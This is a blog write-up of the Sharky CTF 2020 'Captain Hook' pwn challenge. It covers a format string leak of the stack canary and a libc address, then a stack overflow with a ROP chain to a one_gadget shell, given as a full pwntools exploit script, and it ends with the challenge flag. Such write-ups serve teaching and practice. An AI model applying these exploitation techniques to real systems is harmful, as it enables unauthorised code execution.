---
title: "Sharky CTF 2020: Captain Hook (Pwn)"
layout: post
date: 2020-05-12
tags:
- CTF
- writeup
- Sharky CTF 2020
- Pwn
comments: true
---

> Find a way to pop a shell.
>
> Creator: Hackhim
>
> [captain_hook](/files/captain_hook)
>
> [libc-2.27.so](/files/libc-2.27-x64.so)

As with most pwn challenges, let's start off by checking what kind of binary we're given.

```
vagrant@ctf:/vagrant/challenges/sharky/captain_hook$ file captain_hook
captain_hook: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 2.6.32, BuildID[sha1]=2f0c9d4bc44173b7f5b7b301c288f44f1b16c6ba, not stripped
```

Okay, it's just a 64 bit ELF binary just like the give_away_2.

```
vagrant@ctf:/vagrant/challenges/sharky/captain_hook$ ./captain_hook

==Commands========
 1 -> List all characters
 2 -> Lock up a new character
 3 -> Read character infos
 4 -> Edit character infos
 5 -> Free a character
 6 -> Quit
==================

peterpan@pwnuser:~$

```

This is a little more functional than the two give_away challenges. Lets have a look at it in IDA.

```
read_character_infos
--------------------
.text:0000000000000FA0                 call    check_date_format
.text:0000000000000FA5                 test    eax, eax
.text:0000000000000FA7                 jz      short loc_FC0
.text:0000000000000FA9                 mov     rax, [rbp+src]
.text:0000000000000FAD                 add     rax, 36
.text:0000000000000FB1                 mov     rdi, rax        ; format
.text:0000000000000FB4                 mov     eax, 0
.text:0000000000000FB9                 call    printf ; printf(src + 36)
```

If we look closely, `read_character_infos` appears to be vulnerable to a [format string attack](https://owasp.org/www-community/attacks/Format_string_attack) since `src + 36` (date) is effectively controlled by our user input. However, it seems like we're limited in what we can do because a typical format string payload wouldn't pass the `check_date_format` check. So let's put this aside for now.


```
edit_characters
---------------
.text:0000000000000FF3 var_40          = dword ptr -40h
.text:0000000000000FF3 var_3C          = dword ptr -3Ch
.text:0000000000000FF3 s1              = qword ptr -38h
.text:0000000000000FF3 s2              = byte ptr -30h
.text:0000000000000FF3 var_8           = qword ptr -8
/////////////////// MORE CODE HERE ///////////////////////////
.text:00000000000010A3                 lea     rax, [rbp+s2]
.text:00000000000010A7                 mov     esi, 127
.text:00000000000010AC                 mov     rdi, rax
.text:00000000000010AF                 call    read_user_str; read_user_str(s2, 127)
```

Well well well. What do we have here? looks like `read_user_str` might be cause a buffer overflow since it reads an input of size 127. Let's test our hypothesis.

```
==Commands========
 1 -> List all characters
 2 -> Lock up a new character
 3 -> Read character infos
 4 -> Edit character infos
 5 -> Free a character
 6 -> Quit
==================

peterpan@pwnuser:~$ 4
 [ Character index ]: 0
 [ Character ]
  Name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
  Age: 1
  Date (mm/dd/yyyy): 12/12/2020
*** stack smashing detected ***: <unknown> terminated
Aborted (core dumped)
```

Looks like it overflowed, but got flagged by the stack smashing protector. Let's check the security features of the binary.

```
vagrant@ctf:/vagrant/challenges/sharky/captain_hook$ checksec captain_hook
[*] '/vagrant/challenges/sharky/captain_hook/captain_hook'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Right, there's a stack canary. We could potentially write the original value over it if we knew the value, but we don't. However, if we can manage to exploit the earlier format string bug, we can potentially get `printf` to print out the canary value. Maybe let's play around with the program in GDB to see if we can do anything.

```
==Commands========
 1 -> List all characters
 2 -> Lock up a new character
 3 -> Read character infos
 4 -> Edit character infos
 5 -> Free a character
 6 -> Quit
==================

peterpan@pwnuser:~$ 4
 [ Character index ]: 0
 [ Character ]
  Name: ABCDEFGHIJKLMNOPQRSTUVWXYZ
  Age: 1
  Date (mm/dd/yyyy): 12/12/2020
peterpan@pwnuser:~$ ^C

Program received signal SIGINT, Interrupt.
0x00007ffff7af4081 in __GI___libc_read (fd=0, buf=0x7ffff7dcfa83 <_IO_2_1_stdin_+131>, nbytes=1) at ../sysdeps/unix/sysv/linux/read.c:27

pwndbg> vis

0x555555757000	0x0000000000000000	0x0000000000000251	........Q.......
/////////////////////////////////// TRUNCATED //////////////////////////////////
0x555555757250	0x0000000000000000	0x0000000000000051	........Q.......
0x555555757260	0x4847464544434241	0x504f4e4d4c4b4a49	ABCDEFGHIJKLMNOP
0x555555757270	0x5857565554535251	0x0000000000005a59	QRSTUVWXYZ......
0x555555757280	0x312f323100000001	0x4c4b303230322f32	....12/12/2020KL
0x555555757290	0x54535251504f4e4d	0x00005a5958575655	MNOPQRSTUVWXYZ..
0x5555557572a0	0x0000000000000000	0x0000000000020d61	........a.......	 <-- Top chunk
```

Hol up, this is really odd. Seems like any character in our name beyond the 10th character gets appended to the back of the date. Well, that's convenient. This solves our earlier issue of having to pass the `check_date_format` check. Since `printf` will just print until a null character, it'll print the date followed by whatever our format string payload leaks. Ok, now let's see if we can leak the canary and maybe a libc address so that we can call `one_gadget` to get a shell.

```
Breakpoint 1, 0x0000555555554e89 in read_character_infos ()

────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────
00:0000│ rbp rsp  0x7fffffffdca0 —▸ 0x7fffffffdcc0 —▸ 0x5555555553c0 (__libc_csu_init) ◂— push   r15
01:0008│          0x7fffffffdca8 —▸ 0x55555555535a (main+173) ◂— jmp    0x55555555538d
02:0010│          0x7fffffffdcb0 ◂— 0x300000005
03:0018│          0x7fffffffdcb8 ◂— 0x5226422b7e97ff00  <== canary
04:0020│          0x7fffffffdcc0 —▸ 0x5555555553c0 (__libc_csu_init) ◂— push   r15
05:0028│          0x7fffffffdcc8 —▸ 0x7ffff7a05b97 (__libc_start_main+231) ◂— mov    edi, eax <== libc address
06:0030│          0x7fffffffdcd0 ◂— 0x1
07:0038│          0x7fffffffdcd8 —▸ 0x7fffffffdda8 —▸ 0x7fffffffe0d3 ◂— '/vagrant/challenges/sharky/captain_hook/captain_hook'
───────────────────────────────────────────────────────[ BACKTRACE ]────────────-─────────────────────────────────────────────
 ► f 0     555555554e89 read_character_infos+4
   f 1     55555555535a main+173
   f 2     7ffff7a05b97 __libc_start_main+231
```

Okay, awesome. Looks like we have both the canary value and `__libc_start_main+231` (libc address) present in the stack in `read_character_infos`. Great, now all we have to do is craft our exploit!

```python
#! /usr/bin/python2

from pwn import *

HOST = 'sharkyctf.xyz'
PORT = 20336
BINARY = './captain_hook'

elf = context.binary = ELF(BINARY)
libc = ELF('./libc-2.27.so')

# Gadgets

libc.symbols['one_gadget'] = 0x4f322

'''
One Gadget
----------
0x4f322 execve("/bin/sh", rsp+0x40, environ)
constraints:
    [rsp+0x40] == NULL
'''

# Offsets

CANARY_OFFSET = 40

'''
# Name input as: ABCDEFGHIJK
# Canary (0x49126acae49f1d00) is 40 bytes away

pwndbg> x/10gx $rsp
0x7fffffffdc60:	0x0000000000000000	0x0000555555757260
0x7fffffffdc70:	0x4847464544434241	0x00005500004b4a49  <- Name input
0x7fffffffdc80:	0x00007fffffffdda0	0x3400555500000004
0x7fffffffdc90:	0x000055555575000a	0x49126acae49f1d00  <- Canary
0x7fffffffdca0:	0x00007fffffffdcc0	0x0000555555555366

pwndbg> canary
AT_RANDOM = 0x7fffffffe0b9 # points to (not masked) global canary value
Canary    = 0x49126acae49f1d00
'''

# RIP Padding

PAYLOAD_PADDING = CANARY_OFFSET + 8 + 8  # Add 8 for canary and 8 more for rbp

# Helper Functions

PROMPT = 'peterpan@pwnuser:~$ '

def lock(conn, name = 'AAAA', index = 0, age = 1, date = '12/12/2020'):
    conn.sendlineafter(PROMPT, '2')
    conn.sendlineafter(' [ Character index ]: ', str(index))
    conn.sendlineafter('  Name: ', name)
    conn.sendlineafter('  Age: ', str(age))
    conn.sendlineafter('  Date (mm/dd/yyyy): ', date)

def read(conn, index = 0):
    response = {
        'name': '',
        'age': 0,
        'date': '',
    }
    conn.sendlineafter(PROMPT, '3')
    conn.sendlineafter(' [ Character index ]: ', str(index))

    conn.recvuntil('Character name: ')
    response['name'] = conn.recvline().strip()

    conn.recvuntil('Age: ')
    response['age'] = int(conn.recvline())

    conn.recvuntil('He\'s been locked up on ')
    response['date'] = conn.recvline().strip()[:-1]  # Drop training fullstop

    return response

def edit(conn, name = 'AAAA', index = 0, age = 1, date = '12/12/2020'):
    conn.sendlineafter(PROMPT, '4')
    conn.sendlineafter(' [ Character index ]: ', str(index))
    conn.sendlineafter('  Name: ', name)
    conn.sendlineafter('  Age: ', str(age))
    conn.sendlineafter('  Date (mm/dd/yyyy): ', date)

# Start connection

r = remote(HOST, PORT)

# Stage 1: Leak canary and libc address

PAYLOAD = ('A' * 10) + '.%17$p.%19$p'

'''
──────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────
000000│ rbp rsp  0x7fffffffdca0 —▸ 0x7fffffffdcc0 —▸ 0x5555555553c0 (__libc_csu_init) ◂— push   r15
01:0008│          0x7fffffffdca8 —▸ 0x55555555535a (main+173) ◂— jmp    0x55555555538d
02:0010│          0x7fffffffdcb0 ◂— 0x300000000
03:0018│          0x7fffffffdcb8 ◂— 0xb45650d9e57dcf00 <== canary value, %17$p
04:0020│          0x7fffffffdcc0 —▸ 0x5555555553c0 (__libc_csu_init) ◂— push   r15
05:0028│          0x7fffffffdcc8 —▸ 0x7ffff7a05b97 (__libc_start_main+231) ◂— mov    edi, eax  <== libc address, %19$p
06:0030│          0x7fffffffdcd0 ◂— 0x1
07:0038│          0x7fffffffdcd8 —▸ 0x7fffffffdda8 —▸ 0x7fffffffe0d3 ◂— '/vagrant/challenges/sharky/captain_hook/captain_hook'
────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────
 ► f 0     555555554e89 read_character_infos+4
   f 1     55555555535a main+173
   f 2     7ffff7a05b97 __libc_start_main+231
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> canary
AT_RANDOM = 0x7fffffffe0b9 # points to (not masked) global canary value
Canary    = 0xb45650d9e57dcf00
'''

log.info('Payload: {}'.format(PAYLOAD))

lock(r)

edit(r, name = PAYLOAD)

response = read(r)
leaked = response['date'].split('.')
canary = int(leaked[1][2:], 16)
libc_leak = int(leaked[2][2:], 16) # __libc_start_main + 231

log.success('Leaked canary value: 0x{:x}'.format(canary))
log.success('Leaked (__libc_start_main + 231): 0x{:x}'.format(libc_leak))

# Stage 2: Build Rop Chain (Call one_gadget)

libc.address = libc_leak - (libc.symbols['__libc_start_main'] + 231)
log.info('Calculated libc base address: 0x{:x}'.format(libc.address))

rop = ROP(libc)
rop.one_gadget()

log.success('Built ROP Chain (Call one_gadget)')
log.success(rop.dump())

# Stage 3: Pwn

edit(r, name = fit({CANARY_OFFSET: p64(canary), PAYLOAD_PADDING: rop.chain()}))

log.success('Sent payload')
log.progress('Spawning a shell...')

r.interactive()
```

Let's see it in action!

<script id="asciicast-329530" src="https://asciinema.org/a/329530.js" async></script>

Flag: `shkCTF{I_R34lly_l0ve_fr33_H0Ok_m4n}`
